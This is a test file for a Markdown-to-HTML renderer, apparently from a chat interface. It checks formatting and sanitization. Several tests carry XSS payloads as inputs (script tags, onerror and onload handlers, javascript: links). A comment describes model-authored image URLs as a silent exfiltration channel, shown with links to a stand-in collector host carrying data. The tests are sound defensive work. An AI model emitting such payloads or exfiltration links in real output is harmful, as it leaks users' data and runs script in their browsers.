import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';

/** Render the sanitized HTML into a detached node so we can assert on real DOM. */
function intoDom(md: string): HTMLDivElement {
  const div = document.createElement('div');
  div.innerHTML = renderMarkdown(md);
  return div;
}

describe('renderMarkdown', () => {
  it('renders **bold** as <strong>', () => {
    const dom = intoDom('Hello **world**');
    expect(dom.querySelector('strong')?.textContent).toBe('world');
  });

  it('renders *italics* as <em>', () => {
    const dom = intoDom('say *hi* now');
    expect(dom.querySelector('em')?.textContent).toBe('hi');
  });

  it('renders a bullet list as <ul><li>', () => {
    const dom = intoDom('- one\n- two\n- three');
    expect(dom.querySelector('ul')).toBeTruthy();
    expect(dom.querySelectorAll('li')).toHaveLength(3);
    expect(dom.querySelectorAll('li')[0]?.textContent).toBe('one');
  });

  it('renders an ordered list as <ol><li>', () => {
    const dom = intoDom('1. first\n2. second');
    expect(dom.querySelector('ol')).toBeTruthy();
    expect(dom.querySelectorAll('li')).toHaveLength(2);
  });

  it('renders a GFM table as <table> with rows', () => {
    const dom = intoDom('| A | B |\n| - | - |\n| 1 | 2 |');
    expect(dom.querySelector('table')).toBeTruthy();
    expect(dom.querySelectorAll('th')).toHaveLength(2);
    expect(dom.querySelectorAll('tbody td')).toHaveLength(2);
  });

  it('renders headings as <h1>/<h2>', () => {
    const dom = intoDom('# Big\n\n## Smaller');
    expect(dom.querySelector('h1')?.textContent).toBe('Big');
    expect(dom.querySelector('h2')?.textContent).toBe('Smaller');
  });

  it('renders inline code as <code> and fenced blocks as <pre><code>', () => {
    expect(intoDom('use `npm test`').querySelector('code')?.textContent).toBe('npm test');
    const block = intoDom('```\nconst x = 1;\n```');
    expect(block.querySelector('pre code')?.textContent).toContain('const x = 1;');
  });

  it('renders links and forces them to open safely in a new tab', () => {
    const a = intoDom('[Breeze](https://breeze.example.com)').querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://breeze.example.com');
    expect(a?.getAttribute('target')).toBe('_blank');
    // no referrer / no opener leakage when opening a new tab
    expect(a?.getAttribute('rel')).toContain('noopener');
    expect(a?.getAttribute('rel')).toContain('noreferrer');
  });

  it('strips <script> tags (no injection)', () => {
    const html = renderMarkdown('hi <script>alert(1)</script> there');
    expect(html.toLowerCase()).not.toContain('<script');
    expect(html.toLowerCase()).not.toContain('alert(1)');
  });

  it('strips event-handler attributes and javascript: URLs', () => {
    const imgHtml = renderMarkdown('<img src=x onerror="alert(1)">');
    expect(imgHtml.toLowerCase()).not.toContain('onerror');

    const a = intoDom('[x](javascript:alert(1))').querySelector('a');
    // dompurify drops the dangerous href entirely
    expect(a?.getAttribute('href') ?? '').not.toContain('javascript:');
  });

  it('renders a markdown image as a click-through link, never an auto-loading <img>', () => {
    // An <img src> fires its GET the moment innerHTML inserts it, so a URL the
    // model authored is a silent exfiltration channel (see markdown.ts).
    const dom = intoDom('see ![](https://collector.example/beacon?d=secret)');
    expect(dom.querySelector('img')).toBeNull();
    const a = dom.querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://collector.example/beacon?d=secret');
    expect(a?.getAttribute('rel')).toContain('noopener');
  });

  it('renders a non-http(s) image source as inert text', () => {
    const dom = intoDom('<img src="data:image/svg+xml,<svg onload=alert(1)>" alt="pic">');
    expect(dom.querySelector('img')).toBeNull();
    expect(dom.querySelector('a')).toBeNull();
    expect(dom.textContent).toContain('pic');
  });

  it('drops elements that load a remote subresource without a click', () => {
    for (const md of [
      '<video poster="https://collector.example/p?d=1"></video>',
      '<svg><image href="https://collector.example/i?d=2"></image></svg>',
      '<picture><source srcset="https://collector.example/s?d=3"></picture>',
    ]) {
      const html = renderMarkdown(md).toLowerCase();
      expect(html).not.toContain('<video');
      expect(html).not.toContain('<svg');
      expect(html).not.toContain('<image');
      expect(html).not.toContain('<source');
      expect(html).not.toContain('collector.example');
    }
  });

  it('does not throw on partial/incomplete markdown (streaming-friendly)', () => {
    // half-typed table, unterminated bold, dangling fence, open link
    const partials = [
      '| A | B',
      'this is **bol',
      '```\nconst x =',
      '[click here](https://exa',
      '## ',
      '- ',
    ];
    for (const p of partials) {
      expect(() => renderMarkdown(p)).not.toThrow();
      expect(typeof renderMarkdown(p)).toBe('string');
    }
  });

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
    expect(renderMarkdown('   ')).toBe('');
  });
});
